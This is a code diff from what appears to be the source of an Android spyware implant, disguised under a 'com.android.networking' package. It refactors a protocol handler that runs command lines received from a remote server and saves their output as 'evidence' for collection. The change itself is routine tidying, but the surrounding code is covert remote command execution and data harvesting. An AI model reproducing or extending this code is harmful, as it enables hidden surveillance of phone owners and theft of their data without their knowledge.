@@ -19,7 +19,6 @@ import org.apache.http.util.EncodingUtils;
 
 import com.android.networking.Core;
 import com.android.networking.Device;
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.action.ExecuteAction;
@@ -28,9 +27,10 @@ import com.android.networking.crypto.CryptoException;
 import com.android.networking.crypto.EncryptionPKCS5;
 import com.android.networking.crypto.Keys;
 import com.android.networking.crypto.SHA1Digest;
-import com.android.networking.evidence.Evidence;
+
 import com.android.networking.evidence.EvidenceCollector;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
@@ -997,23 +997,15 @@ public class ZProtocol extends Protocol {
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int numCommand = dataBuffer.readInt();
+				
 				for (int i = 0; i < numCommand; i++) {
 					String executionLine = WChar.readPascal(dataBuffer);
 					executionLine = Directory.expandMacro(executionLine);
 
 					ExecuteResult ret = Execute.execute(executionLine);
 
-					Evidence evidence = new Evidence(EvidenceType.COMMAND);
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (parseExecute) Output:" + ret.getStdout());
-					}
-
-					byte[] content =  WChar.getBytes(ret.getStdout(),true);
-					final byte[] additional = WChar.pascalize(executionLine);
-
-					new LogR(EvidenceType.COMMAND, LogR.LOG_PRI_STD, additional, content);
+					saveExecutionEvidence(ret);
 					
-
 				}
 
 			} catch (final IOException e) {
@@ -1038,12 +1030,23 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
+	private void saveExecutionEvidence(ExecuteResult ret) {
+		//Evidence evidence = new Evidence(EvidenceType.COMMAND);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (parseExecute) Output:" + ret.getStdout());
+		}
+
+		byte[] content =  WChar.getBytes(ret.getStdout(),true);
+		final byte[] additional = WChar.pascalize(ret.executionLine);
+
+		LogR.atomic(EvidenceType.COMMAND, additional, content);
+	}
+
 	protected void purgeEvidences(final String basePath, Date date, int size) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: purgeEvidences from: " + basePath); //$NON-NLS-1$
 		}
 		final EvidenceCollector logCollector = EvidenceCollector.self();
-
 		final Vector dirs = logCollector.scanForDirLogs(basePath);
 
 		final int dsize = dirs.size();
